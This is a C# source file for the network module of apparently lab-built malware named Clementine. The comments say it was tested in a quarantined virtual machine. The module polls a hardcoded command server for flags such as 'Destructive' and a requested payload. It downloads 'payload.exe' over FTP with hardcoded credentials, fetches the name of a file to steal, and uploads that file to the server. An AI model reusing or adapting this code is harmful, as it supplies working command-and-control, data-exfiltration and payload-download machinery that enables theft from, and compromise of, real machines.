using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using FluentFTP;

#if DEBUG
using System.Windows.Forms;
#endif

namespace Clementine
{
    public class ClementineNetwork
    {
        /*
         * According to https://askubuntu.com/questions/354412/find-host-ip-address-when-guest-machine-is-connected-to-host
         * This is the IP of the host OS when Oracle VirtualBox Box puts networking on host-only mode (which I chose here to quarantine the guest VM and to keep a static IP address on my
         * laptop).  It may vary between installations.
        */
        private const string IP = "10.195.88.164";
        private const int PORT = 4398;

        private const byte NO_PAYLOAD_NETWORK = (byte)255;
        private const int NO_PAYLOAD_MACHINE = -1;

        private static readonly UTF8Encoding encoding = new UTF8Encoding();

        public bool Done { get; private set; }
        public bool Destructive { get; private set; }
        public bool Loud { get; private set; }
        public int RequestedPayload { get; private set; }

        public string FileToSteal { get; private set; }

        private const string REQUEST_STATE = "GET_STATE";
        private const string STEAL_FILE_NAME = "STEAL_FILE_NAME";

        private const int STATE_BYTES = 4;

        public static readonly string CUSTOM_PAYLOAD_LOCATION = Utilities.GetFileName("payload.exe");

        public ClementineNetwork()
        {
            Done = false;
            Destructive = false;
            Loud = true;
            RequestedPayload = -1;
        }

        private static byte[] ReadExactly(NetworkStream stream, int toRead)
        {
            var responseBytes = new byte[toRead];
            var bytesRead = 0;
            while (bytesRead < toRead)
            {
                bytesRead += stream.Read(responseBytes, bytesRead, responseBytes.Length - bytesRead);
            }
            return responseBytes;
        }

        private static void WriteString(NetworkStream stream, string send)
        {
            var requestBytes = encoding.GetBytes(send);
            stream.Write(requestBytes, 0, requestBytes.Length);
            stream.WriteByte(0);
        }

        private static string ReadString(NetworkStream stream)
        {
            using (var result = new MemoryStream())
            {
                byte data;
                while ((data = (byte)stream.ReadByte()) > 0)
                {
                    result.WriteByte(data);
                }
                return encoding.GetString(result.ToArray());
            }
        }

        public void UpdateState()
        {
            try
            {
                using (var server = new TcpClient(IP, PORT))
                {
                    server.SendTimeout = 1000;
                    server.ReceiveTimeout = 1000;
                    var stream = server.GetStream();
                    WriteString(stream, REQUEST_STATE);
                    var responseBytes = ReadExactly(stream, STATE_BYTES);
                    Done = responseBytes[0] == 1;
                    Destructive = responseBytes[1] == 1;
                    Loud = responseBytes[2] == 1;
                    RequestedPayload = responseBytes[3] == NO_PAYLOAD_NETWORK ? NO_PAYLOAD_MACHINE : responseBytes[3];
                    MessageBox.Show("Done: " + Done + " Destructive: " + Destructive + " Loud " + Loud + " Payload " + RequestedPayload);
                }
            }
            catch (Exception e)
            {
#if DEBUG
                MessageBox.Show(e.ToString());
#endif
            }
        }

        private static NetworkCredential GetCredentials()
        {
            return new NetworkCredential("Clementine", "NYrEiCMnAMxXzVcDPT4l");
        }

        public bool RequestPayload()
        {
            using (var ftp = new FtpClient())
            {
                ftp.Host = IP;
                ftp.Credentials = GetCredentials();
                ftp.Connect();
                var ret = ftp.DownloadFile(CUSTOM_PAYLOAD_LOCATION, "/payload.exe");
                ftp.Disconnect();
                return ret;
            }
        }

        public string StealFileName()
        {
            try
            {
                using (var server = new TcpClient(IP, PORT))
                {
                    server.SendTimeout = 1000;
                    server.ReceiveTimeout = 1000;
                    var stream = server.GetStream();
                    WriteString(stream, STEAL_FILE_NAME);
                    return ReadString(stream);
                }
            }
            catch (Exception e)
            {
#if DEBUG
                MessageBox.Show(e.ToString());
#endif
            }
            return "";
        }

        public void SendFile(string name)
        {
            try
            {
                using (var ftp = new FtpClient())
                {
                    ftp.Host = IP;
                    ftp.Port = 21;
                    ftp.Credentials = GetCredentials();
                    ftp.ConnectTimeout = 30 * 1000;
                    ftp.Connect();
                    var last = name.LastIndexOf("\\");
                    var subname = last >= 0 ? name.Substring(last) : name;
                    ftp.UploadFile(name, "/" + subname);
                    ftp.Disconnect();
                }
            }
            catch (Exception exp)
            {
#if DEBUG
                MessageBox.Show("FTP Server upload failed" + exp.ToString());
#endif
            }
        }
    }
}
